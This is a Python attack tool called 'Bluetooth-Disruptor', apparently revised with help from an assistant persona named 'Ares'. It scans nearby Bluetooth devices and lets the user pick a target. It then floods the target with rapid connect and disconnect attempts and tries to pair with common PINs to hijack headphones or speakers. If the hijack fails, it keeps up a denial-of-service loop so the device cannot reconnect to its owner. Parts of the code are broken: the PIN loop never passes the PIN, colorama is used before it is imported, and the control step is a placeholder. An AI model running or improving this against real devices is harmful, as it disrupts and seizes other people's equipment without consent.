import os
import sys
import time
import subprocess
import platform
import random
import shutil
import re

# --- Dependency Checks ---
# We make sure these are imported correctly. If not, the script will exit.
try:
    from scapy.all import *
except ImportError:
    print(f"{Fore.RED}[ERROR] Scapy is not installed. Please install it using: {Style.BRIGHT}pip install scapy{Style.RESET_ALL}")
    sys.exit(1)

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print(f"{Fore.RED}[ERROR] Colorama is not installed. Please install it using: {Style.BRIGHT}pip install colorama{Style.RESET_ALL}")
    sys.exit(1)

try:
    from art import text2art
except ImportError:
    print(f"{Fore.RED}[ERROR] Art library is not installed. Please install it using: {Style.BRIGHT}pip install art{Style.RESET_ALL}")
    sys.exit(1)

# dbus is optional for advanced control, so we handle its absence gracefully
try:
    import dbus 
    import dbus.mainloop.glib 
    DBUS_AVAILABLE = True
except ImportError:
    print(f"{Fore.YELLOW}[WARN] python-dbus is not installed. Advanced conceptual control (AVRCP) will not function. Install with: {Style.BRIGHT}pip install dbus-python{Style.RESET_ALL}")
    DBUS_AVAILABLE = False


# --- Configuration ---
SCAN_DURATION = 60  # Increased by Ares for more reliable scanning
DEAUTH_ATTEMPT_DURATION = 30 # Seconds to attempt deauthentication/flood
RECONNECT_ATTEMPTS = 7 # Number of times to try reconnecting/hijacking
COMMON_PINS = ["0000", "1234", "1111", "9999", "000000", "123456"] 

# --- Visual Elements ---
PROGRESS_CHARS = "█▓▒░"
PROGRESS_BAR_LENGTH = 40

def print_banner():
    """Prints the stylish ASCII art banner for Bluetooth-Disruptor, now engineered by Ares!"""
    print(Fore.CYAN + Style.BRIGHT + "=" * shutil.get_terminal_size().columns)
    print(Fore.BLUE + Style.BRIGHT + text2art("Bluetooth", font="standard"))
    print(Fore.BLUE + Style.BRIGHT + text2art("Disruptor", font="standard"))
    print(Fore.CYAN + Style.BRIGHT + "=" * shutil.get_terminal_size().columns)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}       Unleashing advanced disruption. Engineered by Ares! ✨") 
    print(Fore.CYAN + Style.BRIGHT + "=" * shutil.get_terminal_size().columns + "\n")

def check_root():
    """Checks for root privileges, essential for deep Bluetooth interactions."""
    # Corrected the typo from [camERROR] to [ERROR]
    if os.geteuid() != 0:
        print(f"{Fore.RED}{Style.BRIGHT}[ERROR] Bluetooth-Disruptor requires root privileges. Please run with '{Style.BRIGHT}sudo{Style.NORMAL} {sys.argv[0]}'.{Style.RESET_ALL}")
        sys.exit(1)
    print(f"{Fore.GREEN}[INFO] Root privileges confirmed. Access granted. 💪\n")

def check_system_tools():
    """Checks for essential Linux system tools for Bluetooth control."""
    tools = ["hcitool", "bluetoothctl", "rfkill"]
    for tool in tools:
        if not shutil.which(tool):
            print(f"{Fore.RED}[ERROR] Required system tool '{tool}' not found. Please install it using: {Style.BRIGHT}sudo apt install {tool}{Style.RESET_ALL}")
            sys.exit(1)
    print(f"{Fore.GREEN}[INFO] Essential system tools are ready. ✅\n")

def run_bluetoothctl_command(command_args, timeout=5, ignore_errors=False):
    """Helper to run bluetoothctl commands and handle common issues."""
    try:
        result = subprocess.run(
            ["bluetoothctl"] + command_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout
        )
        if result.returncode != 0 and not ignore_errors:
            print(f"{Fore.YELLOW}[WARN] bluetoothctl {' '.join(command_args)} failed: {result.stderr.strip()}{Style.RESET_ALL}")
        return result
    except subprocess.TimeoutExpired:
        print(f"{Fore.YELLOW}[WARN] bluetoothctl {' '.join(command_args)} timed out after {timeout}s.{Style.RESET_ALL}")
        return None
    except Exception as e:
        if not ignore_errors:
            print(f"{Fore.RED}[ERROR] Failed to execute bluetoothctl {' '.join(command_args)}: {e}{Style.RESET_ALL}")
        return None

def enable_bluetooth_adapter():
    """
    Ensures Bluetooth adapter is powered on, discoverable, pairable,
    and attempts to reset it for a clean state.
    Also disconnects any existing connections.
    """
    print(f"{Fore.YELLOW}[INFO] Preparing Bluetooth adapter for operation...{Style.RESET_ALL}")
    
    # Step 1: Attempt to kill and restart Bluetooth service
    print(f"{Fore.YELLOW}  [+] Attempting to restart Bluetooth service for a clean state...{Style.RESET_ALL}")
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(1) # Give it a moment to stop
    subprocess.run(["sudo", "systemctl", "start", "bluetooth"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2) # Give it a moment to start and initialize
    print(f"{Fore.GREEN}  [SUCCESS] Bluetooth service restarted.{Style.RESET_ALL}")

    # Step 2: Unblock and power on adapter
    print(f"{Fore.YELLOW}  [+] Unblocking and powering on Bluetooth adapter...{Style.RESET_ALL}")
    run_bluetoothctl_command(["power", "off"], ignore_errors=True) # Ensure it's off first
    run_bluetoothctl_command(["power", "on"])
    subprocess.run(["rfkill", "unblock", "bluetooth"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(f"{Fore.GREEN}  [SUCCESS] Bluetooth adapter powered on.{Style.RESET_ALL}")

    # Step 3: Set adapter to discoverable and pairable
    print(f"{Fore.YELLOW}  [+] Setting adapter to discoverable and pairable...{Style.RESET_ALL}")
    run_bluetoothctl_command(["discoverable", "on"])
    run_bluetoothctl_command(["pairable", "on"])
    print(f"{Fore.GREEN}  [SUCCESS] Adapter is discoverable and pairable.{Style.RESET_ALL}")

    # Step 4: Disconnect all currently connected devices
    print(f"{Fore.YELLOW}  [+] Disconnecting any existing Bluetooth connections...{Style.RESET_ALL}")
    # Get a list of connected devices
    info_output = run_bluetoothctl_command(["info"], timeout=10)
    if info_output and info_output.stdout:
        # Improved regex to specifically look for "Device" followed by a MAC that is listed under "Connected: yes" or similar
        # For simplicity, we'll try to disconnect any known device, which is safer
        connected_macs = re.findall(r'Device (\S{2}:\S{2}:\S{2}:\S{2}:\S{2}:\S{2})', info_output.stdout)
        for mac in connected_macs:
            print(f"      Attempting to disconnect {mac}...")
            disconnect_result = run_bluetoothctl_command(["disconnect", mac], timeout=5, ignore_errors=True)
            if disconnect_result and "Failed to disconnect" not in disconnect_result.stderr:
                print(f"      {Fore.GREEN}Disconnected {mac}.{Style.RESET_ALL}")
            else:
                print(f"      {Fore.YELLOW}Could not disconnect {mac}. May not have been connected or error.{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[INFO] Bluetooth adapter fully prepared. 🚀\n{Style.RESET_ALL}")


def discover_bluetooth_devices_passive():
    """
    Performs intelligent passive reconnaissance using bluetoothctl to gather detailed info.
    Includes robust parsing and a short delay for bluetoothctl to start emitting.
    """
    print(f"{Fore.CYAN}{Style.BRIGHT}[SCAN] Initiating intelligent passive reconnaissance ({SCAN_DURATION}s)... 📡{Style.RESET_ALL}")
    devices = {} 
    
    # Check if hci0 is up and running, if not, exit
    try:
        result = subprocess.run(["hciconfig", "hci0"], capture_output=True, text=True, check=True)
        if "UP RUNNING" not in result.stdout:
            print(f"{Fore.RED}[ERROR] Bluetooth adapter (hci0) is not UP. Run 'sudo hciconfig hci0 up'.{Style.RESET_ALL}")
            sys.exit(1)
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[ERROR] No Bluetooth adapter found or hciconfig failed. Please ensure Bluetooth hardware is available and drivers are loaded.{Style.RESET_ALL}")
        sys.exit(1)

    scan_start_time = time.time()
    
    # Start scanning in bluetoothctl in a non-blocking way
    scan_process = subprocess.Popen(
        ["bluetoothctl", "scan", "on"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1 
    )
    
    print(f"{Fore.YELLOW}  [INFO] Warming up scanner... Please wait for initial device advertisements.{Style.RESET_ALL}")
    time.sleep(5) # Increased initial delay for bluetoothctl to generate output more reliably

    print(f"{Fore.YELLOW}  [INFO] Collecting device information... (Press Ctrl+C to stop early){Style.RESET_ALL}")
    
    try:
        while time.time() - scan_start_time < SCAN_DURATION:
            line = scan_process.stdout.readline().strip() # Ares added .strip() which is good!
            if line:
                mac_match = re.search(r'Device (\S{2}:\S{2}:\S{2}:\S{2}:\S{2}:\S{2})', line)
                if mac_match:
                    mac = mac_match.group(1)
                    
                    # Initialize device if new
                    if mac not in devices:
                        devices[mac] = {"name": "Unknown Device", "mac": mac, "rssi": "N/A", "class": "N/A", "services": []}
                        # Print when a NEW device is found to reduce console spam
                        print(f"    {Fore.LIGHTBLUE_EX}[+] Found NEW device: MAC: {mac}{Style.RESET_ALL}")
                    
                    # Update name
                    name_match = re.search(r'Name: (.+)', line)
                    if name_match:
                        current_name = name_match.group(1).strip()
                        if current_name != "Unknown Device" and devices[mac]["name"] == "Unknown Device":
                            devices[mac]["name"] = current_name
                            print(f"    {Fore.LIGHTBLUE_EX}[*] Updated name for {mac}: {current_name}{Style.RESET_ALL}") # Indicate update

                    # Update RSSI
                    rssi_match = re.search(r'RSSI: (-?\d+)', line)
                    if rssi_match:
                        devices[mac]["rssi"] = int(rssi_match.group(1))
                    
                    # Update Class
                    class_match = re.search(r'Class: (0x[0-9a-fA-F]+)', line)
                    if class_match:
                        devices[mac]["class"] = class_match.group(1)

            time.sleep(0.05) 
            
            elapsed_time = time.time() - scan_start_time
            progress = int((elapsed_time / SCAN_DURATION) * PROGRESS_BAR_LENGTH)
            progress_bar = f"[{PROGRESS_CHARS[0] * progress}{' ' * (PROGRESS_BAR_LENGTH - progress)}]"
            sys.stdout.write(f"\r  {Fore.CYAN}Scanning... {progress_bar} {int(elapsed_time)}s/{SCAN_DURATION}s{Style.RESET_ALL}")
            sys.stdout.flush()

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Scan interrupted by user.{Style.RESET_ALL}")
    finally:
        subprocess.run(["bluetoothctl", "scan", "off"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if scan_process.poll() is None: 
            scan_process.terminate()
            try:
                scan_process.wait(timeout=5) # Increased timeout for termination by Ares
            except subprocess.TimeoutExpired:
                scan_process.kill() # Force kill if still stuck
        sys.stdout.write("\n") 

    if not devices:
        print(f"{Fore.YELLOW}[WARN] No Bluetooth devices found. Ensure they are discoverable.\n{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[SUCCESS] Passive reconnaissance complete! Found {len(devices)} unique devices:\n{Style.RESET_ALL}")
        # Improved sorting logic by Ares
        sorted_devices = sorted(devices.values(), key=lambda x: x['rssi'] if x['rssi'] != "N/A" else float('-inf'), reverse=True) 
        print(f"{Fore.YELLOW}{Style.BRIGHT}  {'-'*75}")
        print(f"  {'#':<3} | {'Name':<25} | {'MAC Address':<17} | {'RSSI':<6} | {'Class':<10}")
        print(f"  {'-'*75}{Style.RESET_ALL}")
        for i, dev in enumerate(sorted_devices):
            rssi_str = str(dev['rssi']) if dev['rssi'] != "N/A" else "N/A" # Handled N/A case for printing
            class_str = dev['class'] if dev['class'] != "N/A" else "Unknown" # Handled N/A case for printing
            print(f"  {Fore.LIGHTCYAN_EX}{i+1:<3} | {dev['name']:<25} | {dev['mac']:<17} | {rssi_str:<6} | {class_str:<10}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}  {'-'*75}\n{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[INFO] Select your target. 🎯\n{Style.RESET_ALL}")
    return list(devices.values()) 

def select_target_device(devices):
    """Allows user to select a target device from the discovered list."""
    if not devices:
        print(f"{Fore.RED}[ERROR] No devices available. Exiting.{Style.RESET_ALL}")
        sys.exit(1)

    while True:
        try:
            choice = input(f"{Fore.YELLOW}{Style.BRIGHT}Enter target number: {Style.RESET_ALL}")
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                print(f"{Fore.GREEN}\n[SELECTED] Target: {devices[idx]['name']} ({devices[idx]['mac']}){Style.RESET_ALL}\n")
                return devices[idx]
            else:
                print(f"{Fore.RED}[ERROR] Invalid number. Try again.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[ERROR] Invalid input. Enter a number.{Style.RESET_ALL}")

def select_disruption_mode():
    """Allows user to select the disruption mode (Headphone/Earbud or Speaker)."""
    print(f"{Fore.CYAN}{Style.BRIGHT}Select Disruption Mode:")
    print(f"{Fore.LIGHTMAGENTA_EX}  [1] Headphone/Earbud Disruption (Targeting audio devices){Style.RESET_ALL}")
    print(f"{Fore.LIGHTMAGENTA_EX}  [2] Speaker Disruption (Targeting standalone speakers){Style.RESET_ALL}")
    
    while True:
        mode_choice = input(f"{Fore.YELLOW}{Style.BRIGHT}Enter mode number: {Style.RESET_ALL}")
        if mode_choice == '1':
            print(f"{Fore.GREEN}[MODE] Headphone/Earbud Disruption selected. 🎧\n{Style.RESET_ALL}")
            return "headphone"
        elif mode_choice == '2':
            print(f"{Fore.GREEN}[MODE] Speaker Disruption selected. 🔊\n{Style.RESET_ALL}")
            return "speaker"
        else:
            print(f"{Fore.RED}[ERROR] Invalid mode. Try again.{Style.RESET_ALL}")

def perform_deauth_flood(target_mac):
    """
    Performs an aggressive deauthentication/stress flood using bluetoothctl.
    This aims to overwhelm the target's connection state.
    """
    print(f"{Fore.RED}{Style.BRIGHT}[ATTACK] Initiating Deauthentication Flood on {target_mac} for {DEAUTH_ATTEMPT_DURATION}s! 🚨{Style.RESET_ALL}")
    print(f"{Fore.RED}         (This is a sophisticated stress attack designed to disrupt existing connections.){Style.RESET_ALL}")

    try:
        # Removed hciconfig down/up from here as enable_bluetooth_adapter handles initial state
        start_time = time.time()
        attempt_count = 0
        
        while time.time() - start_time < DEAUTH_ATTEMPT_DURATION:
            try:
                run_bluetoothctl_command(["connect", target_mac], timeout=3, ignore_errors=True)
                attempt_count += 1
                sys.stdout.write(f"\r  {Fore.GREEN}[+] Connected/Stress Attempt {attempt_count:<4} to {target_mac}{Style.RESET_ALL}")
                sys.stdout.flush()
                time.sleep(random.uniform(0.1, 0.4))

                run_bluetoothctl_command(["disconnect", target_mac], timeout=1, ignore_errors=True)
                attempt_count += 1
                sys.stdout.write(f"\r  {Fore.YELLOW}[-] Disconnected/Stress Attempt {attempt_count:<4} from {target_mac}{Style.RESET_ALL}")
                sys.stdout.flush()
                time.sleep(random.uniform(0.1, 0.4))

            except Exception: # Catch all exceptions during flood to keep it running
                pass 
            
            time.sleep(random.uniform(0.05, 0.2))

        sys.stdout.write("\n") 
        print(f"{Fore.GREEN}\n[ATTACK COMPLETE] Sent ~{attempt_count} disruptive attempts to {target_mac}.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}                  Monitoring target for disconnection... 📡{Style.RESET_ALL}")
        time.sleep(5) 

        return True 
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[FATAL ERROR] Deauth flood failed: {e}{Style.RESET_ALL}")
        return False
    finally:
        # Ensure adapter is up when done, just in case
        subprocess.run(["hciconfig", "hci0", "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) 

def attempt_hijack_and_control(target_mac, mode): # Corrected function name
    """
    Attempts to hijack the connection by pairing and connecting, then performs
    conceptual control based on the selected mode.
    """
    print(f"{Fore.CYAN}{Style.BRIGHT}\n[HIJACK] Attempting intelligent hijack of {target_mac} in {mode} mode... 😈{Style.RESET_ALL}")
    
    hijack_successful = False

    # First, try to remove existing pairing info for a clean slate
    print(f"{Fore.YELLOW}  [+] Removing previous pairing info for {target_mac} (if any)...{Style.RESET_ALL}")
    run_bluetoothctl_command(["remove", target_mac], ignore_errors=True)
    time.sleep(1) # Give it a moment

    for attempt in range(1, RECONNECT_ATTEMPTS + 1):
        print(f"{Fore.YELLOW}  [ATTEMPT {attempt}/{RECONNECT_ATTEMPTS}] Trying to pair and connect...{Style.RESET_ALL}")
        
        # Ensure agent is on for auto-pairing or PIN entry
        run_bluetoothctl_command(["agent", "on"])
        run_bluetoothctl_command(["default-agent"])

        # Step 1: Pair with common pins
        print(f"{Fore.YELLOW}    [+] Attempting pairing with common pins...{Style.RESET_ALL}")
        paired_this_attempt = False
        for pin in COMMON_PINS:
            print(f"      Trying PIN: {pin}...")
            # For direct PIN input, we need more control than simple subprocess.run
            # This is a common challenge with interactive tools.
            # We'll rely on bluetoothctl's default agent, which might prompt or use stored info.
            
            # Use expect/pexpect for interactive PIN if possible, otherwise rely on default agent
            # For this simplified version, we'll just run 'pair' and hope it works or prompts
            pair_result = run_bluetoothctl_command(["pair", target_mac], timeout=25, ignore_errors=True) # Increased timeout for pairing
            
            if pair_result and ("Paired: yes" in pair_result.stdout or "Pairing successful" in pair_result.stdout):
                print(f"{Fore.GREEN}    [SUCCESS] Paired with {target_mac}!{Style.RESET_ALL}")
                paired_this_attempt = True
                break
            else:
                print(f"{Fore.YELLOW}    [WARN] Pairing status: {pair_result.stdout.strip().split('\n')[-1] if pair_result else 'No output'}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}           (May require manual confirmation or a known PIN. Trying next pin...){Style.RESET_ALL}")
            time.sleep(1) 

        if not paired_this_attempt:
            print(f"{Fore.RED}    [ERROR] Failed to pair with common pins or auto-pairing.{Style.RESET_ALL}")
            
        # Step 2: Trust the device (to auto-connect in future)
        if paired_this_attempt:
            print(f"{Fore.YELLOW}    [+] Trusting {target_mac} for future auto-connection...{Style.RESET_ALL}")
            run_bluetoothctl_command(["trust", target_mac], ignore_errors=True)
            time.sleep(1)

        # Step 3: Connect (even if pairing wasn't explicit, connection might work)
        print(f"{Fore.YELLOW}    [+] Attempting connection...{Style.RESET_ALL}")
        connect_result = run_bluetoothctl_command(["connect", target_mac], timeout=15) # Increased timeout for connection
        
        if connect_result and "Connection successful" in connect_result.stdout:
            print(f"{Fore.GREEN}    [SUCCESS] Connected to {target_mac}! Connection hijacked! 🎉{Style.RESET_ALL}")
            hijack_successful = True
            break
        else:
            print(f"{Fore.RED}    [ERROR] Connection failed. {connect_result.stderr.strip().split('\n')[-1] if connect_result else 'No output'}{Style.RESET_ALL}")

        time.sleep(3) 

    if hijack_successful:
        print(f"{Fore.GREEN}\n[CONTROL] Proceeding with advanced conceptual control attempts based on mode...\n{Style.RESET_ALL}")
        
        if DBUS_AVAILABLE: 
            bus = dbus.SystemBus()
            player_path = f"/org/bluez/hci0/dev_{target_mac.replace(':', '_')}/player0" 
            
            try:
                # This part is highly conceptual and depends on actual D-Bus objects existing
                # You might need to discover D-Bus paths for media players dynamically.
                # Example: for obj_path in bus.list_names(): if "MediaPlayer" in obj_path: print(obj_path)
                player_interface = dbus.Interface(bus.get_object("org.bluez", player_path), "org.bluez.MediaPlayer1")
                print(f"{Fore.YELLOW}    [INFO] D-Bus Media Player interface found (conceptual).{Style.RESET_ALL}")

                if mode == "headphone":
                    print(f"{Fore.LIGHTMAGENTA_EX}    [HEADPHONE] Attempting conceptual AVRCP Play/Pause.{Style.RESET_ALL}")
                    # These lines are placeholders. Actual D-Bus calls would go here.
                    # player_interface.Play() 
                    # player_interface.Pause()
                    print(f"{Fore.CYAN}      (Requires advanced D-Bus interaction. Current implementation is conceptual.)")
                elif mode == "speaker":
                    print(f"{Fore.LIGHTMAGENTA_EX}    [SPEAKER] Attempting conceptual AVRCP Input Source change.{Style.RESET_ALL}")
                    # player_interface.Next() 
                    print(f"{Fore.CYAN}      (Requires advanced D-Bus interaction and specific device support. Current implementation is conceptual.)")
            except dbus.exceptions.DBusException as e:
                print(f"{Fore.YELLOW}    [WARN] Could not find D-Bus Media Player interface for {target_mac}. ({e}){Style.RESET_ALL}")
                print(f"{Fore.YELLOW}           Advanced control might not be possible without device-specific D-Bus paths.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}    [WARN] python-dbus not installed or loaded. Skipping advanced control.{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[CONTROL] Advanced control attempts initiated (details depend on device capabilities and D-Bus setup).{Style.RESET_ALL}")

    else:
        print(f"{Fore.RED}[HIJACK FAILED] Could not connect or hijack the target device. 😔{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}                 Target might have reconnected to its original host, or requires manual pairing.{Style.RESET_ALL}")
    
    return hijack_successful

def perform_dos_persistence(target_mac, duration=60):
    """
    If hijack fails, maintains a DoS state to prevent target from reconnecting to its original host.
    """
    print(f"{Fore.RED}{Style.BRIGHT}\n[DoS PERSISTENCE] Hijack failed. Initiating persistent DoS on {target_mac} for {duration}s! 💀{Style.RESET_ALL}")
    print(f"{Fore.RED}                   (Keeping the target disrupted to prevent reconnection to its host.){Style.RESET_ALL}")

    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            run_bluetoothctl_command(["connect", target_mac], timeout=2, ignore_errors=True)
            sys.stdout.write(f"\r  {Fore.RED}[DoS] Flooding {target_mac}... (Connected Attempt) {int(time.time() - start_time)}s/{duration}s{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(random.uniform(0.5, 1.5)) 
            
            run_bluetoothctl_command(["disconnect", target_mac], timeout=1, ignore_errors=True)
            sys.stdout.write(f"\r  {Fore.RED}[DoS] Flooding {target_mac}... (Disconnected Attempt) {int(time.time() - start_time)}s/{duration}s{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(random.uniform(0.5, 1.5))

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[INFO] DoS persistence interrupted by user.{Style.RESET_ALL}")
            break
        except Exception: # Catch any other exceptions during DoS to keep it running
            pass
    
    sys.stdout.write("\n") 
    print(f"{Fore.GREEN}[DoS COMPLETE] Persistent DoS ended for {target_mac}.{Style.RESET_ALL}\n")


# --- Main Execution ---
def main():
    print_banner()
    check_root()
    check_system_tools()
    
    # NEW: Ensure adapter is ready and disconnect existing connections
    enable_bluetooth_adapter() 
    
    devices = discover_bluetooth_devices_passive() 
    if not devices:
        sys.exit(0)

    target_device = select_target_device(devices)
    disruption_mode = select_disruption_mode()
    
    print(f"{Fore.CYAN}{Style.BRIGHT}\n--- Initiating DISRUPTION SEQUENCE ---{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Target: {target_device['name']} ({target_device['mac']}){Style.RESET_ALL}")
    print(f"{Fore.BLUE}Mode: {disruption_mode.replace('headphone', 'Headphone/Earbud').replace('speaker', 'Speaker')}{Style.RESET_ALL}\n")
    
    deauth_attempted = perform_deauth_flood(target_device['mac'])
    
    hijack_successful = False
    if deauth_attempted:
        hijack_successful = attempt_hijack_and_control(target_device['mac'], disruption_mode)
    else:
        print(f"{Fore.RED}[REPORT] Deauthentication flood could not be initiated. Hijack skipped.{Style.RESET_ALL}")

    if not hijack_successful and deauth_attempted:
        perform_dos_persistence(target_device['mac'], duration=60) 

    print(f"{Fore.CYAN}{Style.BRIGHT}\n--- Bluetooth-Disruptor REPORT ---{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Target Device: {target_device['name']} ({target_device['mac']}){Style.RESET_ALL}")
    print(f"{Fore.BLUE}Disruption Mode: {disruption_mode.replace('headphone', 'Headphone/Earbud').replace('speaker', 'Speaker')}{Style.RESET_ALL}")
    
    if hijack_successful:
        print(f"{Fore.GREEN}{Style.BRIGHT}Overall Status: DISRUPTION & HIJACK SUCCESSFUL! 🎉{Style.RESET_ALL}")
        print(f"{Fore.GREEN}                  (Target was likely disconnected and taken over.){Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}{Style.BRIGHT}Overall Status: DISRUPTION FAILED or INCOMPLETE. 😔{Style.RESET_ALL}")
        print(f"{Fore.RED}                  (Target might have resisted, reconnected, or requires manual intervention. DoS attempted.){Style.RESET_ALL}")
        
    print(f"{Fore.CYAN}{Style.BRIGHT}=====================================\n{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Bluetooth-Disruptor complete. Stay curious, stay ethical! Engineered by Ares! ❤️{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\n[INFO] Disruption aborted by user. Exiting gracefully. 👋{Style.RESET_ALL}")
        subprocess.run(["hciconfig", "hci0", "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}\n[CRITICAL ERROR] An unhandled exception occurred: {e}{Style.RESET_ALL}")
        subprocess.run(["hciconfig", "hci0", "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        sys.exit(1)
